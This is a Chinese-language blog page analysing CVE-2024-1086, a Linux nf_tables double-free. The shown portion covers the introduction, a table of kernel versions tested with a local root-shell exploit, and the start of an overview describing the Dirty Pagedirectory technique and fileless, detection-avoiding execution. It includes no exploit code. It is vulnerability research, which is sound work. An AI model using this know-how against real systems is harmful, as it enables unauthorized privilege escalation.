<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="keywords" content="Hexo Theme Redefine">
    
    <meta name="author" content="sky123">
    <!-- preconnect -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>

    
    <!--- Seo Part-->
    
    <link rel="canonical" href="https://skyi23.github.io/2024/11/12/cve-2024-1086/"/>
    <meta name="robots" content="index,follow">
    <meta name="googlebot" content="index,follow">
    <meta name="revisit-after" content="1 days">
    
    
    
    
    <!--- Icon Part-->
    <link rel="icon" type="image/png" href="/null" sizes="192x192">
    <link rel="apple-touch-icon" sizes="180x180" href="/null">
    <meta name="theme-color" content="#A31F34">
    <link rel="shortcut icon" href="/null">
    <!--- Page Info-->
    
    <title>
        
            CVE-2024-1086 分析 | sky123&#39;s site
        
    </title>

    
<link rel="stylesheet" href="/fonts/Chillax/chillax.css">


    <!--- Inject Part-->
    

    
<link rel="stylesheet" href="/css/style.css">


    
        
<link rel="stylesheet" href="/css/build/tailwind.css">

    

    
<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">

    
<link rel="stylesheet" href="/fonts/Geist/geist.css">

    <!--- Font Part-->
    
    
        <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono&display=swap" rel="stylesheet">
    
    
    
    
    

    <script id="hexo-configurations">
    window.config = {"hostname":"skyi23.github.io","root":"/","language":"en","path":"search.xml"};
    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":false,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":true,"family":"JetBrains Mono","url":"https://fonts.googleapis.com/css2?family=JetBrains+Mono&display=swap"}},"toc":{"enable":true,"max_depth":5,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":{"enable":false,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"sky123's blog","subtitle":{"text":["书有未曾经我读，事无不可对人言"],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":true,"version":"11.4.1"}},"version":"2.8.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"分类":{"icon":"fa-solid fa-folder","path":"/categories/"},"标签":{"icon":"fa-solid fa-tags","path":"/tags/"},"书签":{"icon":"fa-solid fa-bookmark","path":"/bookmarks/"}},"search":{"enable":true,"preload":true}},"page_templates":{"bookmarks_column":3,"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2024/11/7 00:00:00"};
    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
    window.data = {"masonry":false};
  </script>
    
    <!--- Fontawesome Part-->
    
<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">

    
<link rel="stylesheet" href="/fontawesome/brands.min.css">

    
<link rel="stylesheet" href="/fontawesome/solid.min.css">

    
<link rel="stylesheet" href="/fontawesome/regular.min.css">

    
    
    
    
<!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.3/dist/katex.min.css" integrity="sha256-TThEtR+XalhWKkfF383YLOrI50NGNeIqrzS+q08afrY=" crossorigin="anonymous"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>



<body>
	<div class="progress-bar-container">
	
	<span class="scroll-progress-bar"></span>
	

	
	<span class="pjax-progress-bar"></span>
	<!--        <span class="swup-progress-icon">-->
	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
	<!--        </span>-->
	
</div>

<main class="page-container" id="swup">

	

	<div class="main-content-container flex flex-col justify-between min-h-dvh">
		<div class="main-content-header">
			<header class="navbar-container px-6 md:px-12">
    <div class="navbar-content transition-navbar ">
        <div class="left">
            
            <a class="logo-title" href="/">
                
                sky123&#39;s site
                
            </a>
        </div>

        <div class="right">
            <!-- PC -->
            <div class="desktop">
                <ul class="navbar-list">
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/"
                                        >
                                    <i class="fa-regular fa-house fa-fw"></i>
                                    HOME
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/categories/"
                                        >
                                    <i class="fa-solid fa-folder fa-fw"></i>
                                    分类
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/tags/"
                                        >
                                    <i class="fa-solid fa-tags fa-fw"></i>
                                    标签
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/bookmarks/"
                                        >
                                    <i class="fa-solid fa-bookmark fa-fw"></i>
                                    书签
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                    
                        <li class="navbar-item search search-popup-trigger">
                            <i class="fa-solid fa-magnifying-glass"></i>
                        </li>
                    
                </ul>
            </div>
            <!-- Mobile -->
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
                    </div>
                
                <div class="icon-item navbar-bar">
                    <div class="navbar-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- Mobile sheet -->
    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/"
                        >
                            <span>
                                HOME
                            </span>
                            
                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/categories/"
                        >
                            <span>
                                分类
                            </span>
                            
                                <i class="fa-solid fa-folder fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/tags/"
                        >
                            <span>
                                标签
                            </span>
                            
                                <i class="fa-solid fa-tags fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/bookmarks/"
                        >
                            <span>
                                书签
                            </span>
                            
                                <i class="fa-solid fa-bookmark fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            

            
            
        </ul>

        <div class="statistics flex justify-around my-2.5">
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">8</div>
        <div class="label text-third-text-color text-sm">Tags</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">10</div>
        <div class="label text-third-text-color text-sm">Categories</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">30</div>
        <div class="label text-third-text-color text-sm">Posts</div>
    </a>
</div>
    </div>

    <div class="window-mask"></div>

</header>


		</div>

		<div class="main-content-body transition-fade-up">
			

			<div class="main-content">
				<div class="post-page-container flex relative justify-between box-border w-full h-full">
	<div class="article-content-container">

		<div class="article-title relative w-full">
			
			<div class="w-full flex items-center pt-6 justify-start">
				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">CVE-2024-1086 分析</h1>
			</div>
			
		</div>

		
		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
				<img src="/images/icon.jpg">
			</div>
			<div class="info flex flex-col justify-between">
				<div class="author flex items-center">
					<span class="name text-default-text-color text-lg font-semibold">sky123</span>
					
				</div>
				<div class="meta-info">
					<div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
        <span class="desktop">2024-11-12 01:06:07</span>
        <span class="mobile">2024-11-12 01:06:07</span>
        <span class="hover-info">Created</span>
    </span>
    
        <span class="article-date article-meta-item">
            <i class="fa-regular fa-wrench"></i>&nbsp;
            <span class="desktop">2024-11-16 03:03:21</span>
            <span class="mobile">2024-11-16 03:03:21</span>
            <span class="hover-info">Updated</span>
        </span>
    

    
    

    
    
        <span class="article-wordcount article-meta-item">
            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>29.5k Words</span>
        </span>
    
    
        <span class="article-min2read article-meta-item">
            <i class="fa-regular fa-clock"></i>&nbsp;<span>117 Mins</span>
        </span>
    
    
        <span class="article-pv article-meta-item">
            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

				</div>
			</div>
		</div>
		

		


		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
			<p>这篇博客文章是我系列无样板代码的漏洞研究博客文章中的下一篇，专门为那些希望在未来进行 Linux 内核漏洞研究的时光旅行者而写。具体来说，我希望初学者能够从我的 VR 工作流中学习，而经验丰富的研究人员能够从我的技术中受益。</p>
<p>在这篇博客中，我讨论了我在 Linux 内核中的 <code>nf_tables</code> 发现的一个漏洞（CVE-2024-1086）及其根本原因分析。接着，我展示了我使用的一些新技术，能够在 v5.14 到 v6.6.14 之间的大多数 Linux 内核上（需要未特权的用户命名空间）获取通用 root shell，甚至不需要重新编译漏洞利用代码。由于漏洞利用的环境是数据仅依赖的 KSMA（Kernel-Space Mirroring Attack），这是可行的。这些目标内核包括 Ubuntu 内核、最新的 Debian 内核，以及一些最加固的 Linux 内核（如 KernelCTF 加固内核）。</p>
<p>此外，我提供了概念验证（PoC）源代码（也可在 GitHub 上的 CVE-2024-1086 PoC 仓库中找到）。作为额外的挑战，我还想让漏洞利用支持无文件执行（这在 CNO 中有帮助并避免在渗透测试中被检测到），且完全不对磁盘进行任何更改（包括将 <code>/bin/sh</code> 设置为 SUID 0 等等）。</p>
<p>这篇博客文章也旨在成为原始 Dirty Pagetable 博客的补充指南，考虑到在我开始写这篇博客时，还没有覆盖实际部分（例如，TLB 刷新用于漏洞利用）的博客文章。此外，我希望与 <code>skb</code> 相关的技术能够被嵌入到基于远程网络的漏洞利用中（例如，如果 IPv4 中仍然存在漏洞），并希望 Dirty Pagedirectory 技术能被用于本地提权（LPE）利用中。让我们开始吧！</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/12/CVE-2024-1086/images/cover_better-4.svg"
                     
                ></p>
<h1 id="0-阅读前的说明"><a href="#0-阅读前的说明" class="headerlink" title="0. 阅读前的说明"></a>0. 阅读前的说明</h1><h2 id="0-1-如何阅读这篇博客文章"><a href="#0-1-如何阅读这篇博客文章" class="headerlink" title="0.1 如何阅读这篇博客文章"></a>0.1 如何阅读这篇博客文章</h2><p>对于有抱负的漏洞研究人员：我将这篇博客文章的格式稍微设计得像一篇研究论文，因为这种格式刚好是我所需要的：即使它可能需要很多信息去理解，但也很容易从中扫描和挑选知识。由于研究论文被许多人认为难以阅读，我想给出一些我如何高效地阅读这篇博客文章以提取知识的步骤：</p>
<ol>
<li>阅读概述部分（看看内容是否对你有趣）</li>
<li>分屏阅读这篇博客文章（同时查阅和学习）</li>
<li>跳到 bug 部分（尝试理解这个 bug 是如何工作的）</li>
<li>跳到概念验证部分（通过漏洞利用进行演练）</li>
<li>如果有不清楚的地方，可以利用背景和&#x2F;或技术部分。如果你想了解特定主题，我在大多数部分附上了外部文章。</li>
</ol>
<h2 id="0-2-受影响的内核版本"><a href="#0-2-受影响的内核版本" class="headerlink" title="0.2 受影响的内核版本"></a>0.2 受影响的内核版本</h2><p>本节包含有关受此漏洞利用影响的内核版本的信息，在查找现有漏洞利用技术时很有用。根据这些观察结果，似乎至少从 v5.14.21（含）到 v6.6.14（含）之间的所有版本都可能受到影响，这取决于 <code>kconfig</code> 值（详细信息如下）。这意味着在撰写本文时，稳定分支 <code>linux-5.15.y</code>、<code>linux-6.1.y</code> 和 <code>linux-6.6.y</code> 都受到了这个漏洞的影响，可能包括 <code>linux-6.7.1</code>。幸运的是，稳定分支的一个补丁已于 2024 年 2 月发布。</p>
<blockquote>
<p>注意，相同的基本配置文件被用于大多数原始内核，提到的版本都受 PoC 漏洞影响。基础配置文件是通过 <code>kernel-hardening-checker</code> 生成的。此外，如果某个版本未受漏洞影响，但利用技术仍然有效，则不会在表中显示。</p>
</blockquote>
<p>对于原始内核，<code>CONFIG_INIT_ON_FREE_DEFAULT_ON</code> 在配置中被关闭，这会在释放后将页设置为全为零的字节，这阻碍了漏洞利用中 skb 部分的实现。此配置值在 KernelCTF、Ubuntu 和 Debian 等主要发行版中均关闭，因此我认为这是一个可以接受的措施。然而，<code>CONFIG_INIT_ON_ALLOC_DEFAULT_ON</code> 保持开启状态，因为它是 Ubuntu 和 Debian 内核配置的一部分。不幸的是，这在 v6.4.0 及之后的版本中会导致 <code>bad_page()</code> 检测副作用。关闭 <code>CONFIG_INIT_ON_ALLOC_DEFAULT_ON</code> 后，漏洞利用可以在 v6.6.4 及以下版本上运行。</p>
<p>该漏洞的成功率为 99.4%（n&#x3D;1000），在 Linux 内核 v6.4.16 版本中有时会下降到 93.0%（n&#x3D;1000），环境设置如下（使用 kernelctf 文件系统）。我预计成功率在不同版本之间不会有太大偏差，尽管它可能会因设备的工作负载不同而有所不同。我认为，如果漏洞利用在某个特定设置中尝试所有的利用都成功（通常需要手动验证，通常为 1-2 次），则可以认为它是成功的。由于成功率很高，很容易筛选出漏洞利用是否工作。此外，所有的失败情况均已被调查，并且失败原因也记录在表中，因此不太可能出现误报。</p>
<p>以下是该漏洞利用在不同内核版本及其设置下的测试结果的详细表格：</p>
<table>
<thead>
<tr>
<th>内核</th>
<th>内核版本</th>
<th>发行版</th>
<th>发行版版本</th>
<th>成功&#x2F;失败</th>
<th>CPU 平台</th>
<th>CPU 核心数</th>
<th>内存大小</th>
<th>失败原因</th>
<th>测试状态</th>
<th>配置 URL</th>
</tr>
</thead>
<tbody><tr>
<td>Linux</td>
<td>v5.4.270</td>
<td>无</td>
<td>无</td>
<td>失败</td>
<td>QEMU x86_64</td>
<td>8</td>
<td>16GiB</td>
<td>[代码] nft 代码版本过旧（拒绝规则分配）</td>
<td>最终</td>
<td><a class="link"   target="_blank" rel="noopener" href="https://raw.githubusercontent.com/Notselwyn/blogpost-files/main/nftables/test-kernel-configs/linux-vanilla-v5.4.270.config" >配置文件<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></td>
</tr>
<tr>
<td>Linux</td>
<td>v5.10.209</td>
<td>无</td>
<td>无</td>
<td>失败</td>
<td>QEMU x86_64</td>
<td>8</td>
<td>16GiB</td>
<td>[技术] BUG mm&#x2F;slub.c:4118</td>
<td>最终</td>
<td><a class="link"   target="_blank" rel="noopener" href="https://raw.githubusercontent.com/Notselwyn/blogpost-files/main/nftables/test-kernel-configs/linux-vanilla-v5.10.209.config" >配置文件<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></td>
</tr>
<tr>
<td>Linux</td>
<td>v5.14.21</td>
<td>无</td>
<td>无</td>
<td>成功</td>
<td>QEMU x86_64</td>
<td>8</td>
<td>16GiB</td>
<td>无</td>
<td>最终</td>
<td><a class="link"   target="_blank" rel="noopener" href="https://raw.githubusercontent.com/Notselwyn/blogpost-files/main/nftables/test-kernel-configs/linux-vanilla-v5.14.21.config" >配置文件<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></td>
</tr>
<tr>
<td>Linux</td>
<td>v5.15.148</td>
<td>无</td>
<td>无</td>
<td>成功</td>
<td>QEMU x86_64</td>
<td>8</td>
<td>16GiB</td>
<td>无</td>
<td>最终</td>
<td><a class="link"   target="_blank" rel="noopener" href="https://raw.githubusercontent.com/Notselwyn/blogpost-files/main/nftables/test-kernel-configs/linux-vanilla-v5.15.148.config" >配置文件<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></td>
</tr>
<tr>
<td>Linux</td>
<td>v5.16.20</td>
<td>无</td>
<td>无</td>
<td>成功</td>
<td>QEMU x86_64</td>
<td>8</td>
<td>16GiB</td>
<td>无</td>
<td>最终</td>
<td><a class="link"   target="_blank" rel="noopener" href="https://raw.githubusercontent.com/Notselwyn/blogpost-files/main/nftables/test-kernel-configs/linux-vanilla-v5.16.20.config" >配置文件<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></td>
</tr>
<tr>
<td>Linux</td>
<td>v5.17.15</td>
<td>无</td>
<td>无</td>
<td>成功</td>
<td>QEMU x86_64</td>
<td>8</td>
<td>16GiB</td>
<td>无</td>
<td>最终</td>
<td><a class="link"   target="_blank" rel="noopener" href="https://raw.githubusercontent.com/Notselwyn/blogpost-files/main/nftables/test-kernel-configs/linux-vanilla-v5.17.15.config" >配置文件<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></td>
</tr>
<tr>
<td>Linux</td>
<td>v5.18.19</td>
<td>无</td>
<td>无</td>
<td>成功</td>
<td>QEMU x86_64</td>
<td>8</td>
<td>16GiB</td>
<td>无</td>
<td>最终</td>
<td><a class="link"   target="_blank" rel="noopener" href="https://raw.githubusercontent.com/Notselwyn/blogpost-files/main/nftables/test-kernel-configs/linux-vanilla-v5.18.19.config" >配置文件<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></td>
</tr>
<tr>
<td>Linux</td>
<td>v5.19.17</td>
<td>无</td>
<td>无</td>
<td>成功</td>
<td>QEMU x86_64</td>
<td>8</td>
<td>16GiB</td>
<td>无</td>
<td>最终</td>
<td><a class="link"   target="_blank" rel="noopener" href="https://raw.githubusercontent.com/Notselwyn/blogpost-files/main/nftables/test-kernel-configs/linux-vanilla-v5.19.17.config" >配置文件<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></td>
</tr>
<tr>
<td>Linux</td>
<td>v6.0.19</td>
<td>无</td>
<td>无</td>
<td>成功</td>
<td>QEMU x86_64</td>
<td>8</td>
<td>16GiB</td>
<td>无</td>
<td>最终</td>
<td><a class="link"   target="_blank" rel="noopener" href="https://raw.githubusercontent.com/Notselwyn/blogpost-files/main/nftables/test-kernel-configs/linux-vanilla-v6.0.19.config" >配置文件<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></td>
</tr>
<tr>
<td>Linux</td>
<td>v6.1.55</td>
<td>KernelCTF</td>
<td>Mitigation v3</td>
<td>成功</td>
<td>QEMU x86_64</td>
<td>8</td>
<td>16GiB</td>
<td>无</td>
<td>最终</td>
<td><a class="link"   target="_blank" rel="noopener" href="https://raw.githubusercontent.com/Notselwyn/blogpost-files/main/nftables/test-kernel-configs/linux-kernelctf-mitigationv3-v6.1.55.config" >配置文件<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></td>
</tr>
<tr>
<td>Linux</td>
<td>v6.1.69</td>
<td>Debian</td>
<td>Bookworm 6.1.0-17</td>
<td>成功</td>
<td>QEMU x86_64</td>
<td>8</td>
<td>16GiB</td>
<td>无</td>
<td>最终</td>
<td><a class="link"   target="_blank" rel="noopener" href="https://raw.githubusercontent.com/Notselwyn/blogpost-files/main/nftables/test-kernel-configs/linux-debian-v6.1.0-17-amd64.config" >配置文件<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></td>
</tr>
<tr>
<td>Linux</td>
<td>v6.1.69</td>
<td>Debian</td>
<td>Bookworm 6.1.0-17</td>
<td>成功</td>
<td>AMD Ryzen 5 7640U</td>
<td>6</td>
<td>32GiB</td>
<td>无</td>
<td>最终</td>
<td><a class="link"   target="_blank" rel="noopener" href="https://raw.githubusercontent.com/Notselwyn/blogpost-files/main/nftables/test-kernel-configs/linux-debian-v6.1.0-17-amd64.config" >配置文件<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></td>
</tr>
<tr>
<td>Linux</td>
<td>v6.1.72</td>
<td>KernelCTF</td>
<td>LTS</td>
<td>成功</td>
<td>QEMU x86_64</td>
<td>8</td>
<td>16GiB</td>
<td>无</td>
<td>最终</td>
<td><a class="link"   target="_blank" rel="noopener" href="https://raw.githubusercontent.com/Notselwyn/blogpost-files/main/nftables/test-kernel-configs/linux-kernelctf-lts-v6.1.72.config" >配置文件<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></td>
</tr>
<tr>
<td>Linux</td>
<td>v6.2.?</td>
<td>Ubuntu</td>
<td>Jammy v6.2.0-37</td>
<td>成功</td>
<td>AMD Ryzen 5 7640U</td>
<td>6</td>
<td>32GiB</td>
<td>无</td>
<td>最终</td>
<td>无</td>
</tr>
<tr>
<td>Linux</td>
<td>v6.2.16</td>
<td>无</td>
<td>无</td>
<td>成功</td>
<td>QEMU x86_64</td>
<td>8</td>
<td>16GiB</td>
<td>无</td>
<td>最终</td>
<td><a class="link"   target="_blank" rel="noopener" href="https://raw.githubusercontent.com/Notselwyn/blogpost-files/main/nftables/test-kernel-configs/linux-vanilla-v6.2.16.config" >配置文件<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></td>
</tr>
<tr>
<td>Linux</td>
<td>v6.3.13</td>
<td>无</td>
<td>无</td>
<td>成功</td>
<td>QEMU x86_64</td>
<td>8</td>
<td>16GiB</td>
<td>无</td>
<td>最终</td>
<td><a class="link"   target="_blank" rel="noopener" href="https://raw.githubusercontent.com/Notselwyn/blogpost-files/main/nftables/test-kernel-configs/linux-vanilla-v6.3.13.config" >配置文件<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></td>
</tr>
<tr>
<td>Linux</td>
<td>v6.4.16</td>
<td>无</td>
<td>无</td>
<td>失败</td>
<td>QEMU x86_64</td>
<td>8</td>
<td>16GiB</td>
<td>[技术] 错误页：<code>page-&gt;_mapcount != -1</code>（-513），因为 <code>CONFIG_INIT_ON_ALLOC_DEFAULT_ON=y</code></td>
<td>最终</td>
<td><a class="link"   target="_blank" rel="noopener" href="https://raw.githubusercontent.com/Notselwyn/blogpost-files/main/nftables/test-kernel-configs/linux-vanilla-v6.4.16.config" >配置文件<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></td>
</tr>
<tr>
<td>Linux</td>
<td>v6.5.3</td>
<td>Ubuntu</td>
<td>Jammy v6.5.0-15</td>
<td>失败</td>
<td>QEMU x86_64</td>
<td>8</td>
<td>16GiB</td>
<td>[技术] 错误页：<code>page-&gt;_mapcount != -1</code>（-513），因为 <code>CONFIG_INIT_ON_ALLOC_DEFAULT_ON=y</code></td>
<td>最终</td>
<td><a class="link"   target="_blank" rel="noopener" href="https://raw.githubusercontent.com/Notselwyn/blogpost-files/main/nftables/test-kernel-configs/linux-ubuntu-jammy-v6.5.0-15.config" >配置文件<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></td>
</tr>
<tr>
<td>Linux</td>
<td>v6.5.13</td>
<td>无</td>
<td>无</td>
<td>失败</td>
<td>QEMU x86_64</td>
<td>8</td>
<td>16GiB</td>
<td>[技术] 错误页：<code>page-&gt;_mapcount != -1</code>（-513），因为 <code>CONFIG_INIT_ON_ALLOC_DEFAULT_ON=y</code></td>
<td>最终</td>
<td><a class="link"   target="_blank" rel="noopener" href="https://raw.githubusercontent.com/Notselwyn/blogpost-files/main/nftables/test-kernel-configs/linux-vanilla-v6.5.13.config" >配置文件<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></td>
</tr>
<tr>
<td>Linux</td>
<td>v6.6.14</td>
<td>无</td>
<td>无</td>
<td>失败</td>
<td>QEMU x86_64</td>
<td>8</td>
<td>16GiB</td>
<td>[技术] 错误页：<code>page-&gt;_mapcount != -1</code>（-513），因为 <code>CONFIG_INIT_ON_ALLOC_DEFAULT_ON=y</code></td>
<td>最终</td>
<td><a class="link"   target="_blank" rel="noopener" href="https://raw.githubusercontent.com/Notselwyn/blogpost-files/main/nftables/test-kernel-configs/linux-vanilla-v6.6.14.config" >配置文件<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></td>
</tr>
<tr>
<td>Linux</td>
<td>v6.7.1</td>
<td>无</td>
<td>无</td>
<td>失败</td>
<td>QEMU x86_64</td>
<td>8</td>
<td>16GiB</td>
<td>[代码] <code>nft</code> 判决值被内核更改导致不正确</td>
<td>最终</td>
<td><a class="link"   target="_blank" rel="noopener" href="https://raw.githubusercontent.com/Notselwyn/blogpost-files/main/nftables/test-kernel-configs/linux-vanilla-v6.7.1.config" >配置文件<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></td>
</tr>
</tbody></table>
<h1 id="1-概述"><a href="#1-概述" class="headerlink" title="1. 概述"></a>1. 概述</h1><h2 id="1-1-摘要"><a href="#1-1-摘要" class="headerlink" title="1.1 摘要"></a>1.1 摘要</h2><p>在这篇博客文章中，我介绍了如何利用 Linux 内核中的一个 0-day 双重释放漏洞（例如 KernelCTF 加固内核实例），成功率为 93%-99%。该漏洞的根本原因是 <code>netfilter</code> 判决的输入验证失败。因此，漏洞利用的前提是启用了 <code>nf_tables</code> 并且启用了非特权用户命名空间。该漏洞利用是数据驱动的，使用了一种名为 Dirty Pagedirectory 的新技术，从用户态执行内核空间镜像攻击（KSMA），能够将任何物理地址及其权限链接到虚拟内存地址，只需从用户态进行读&#x2F;写操作即可。</p>
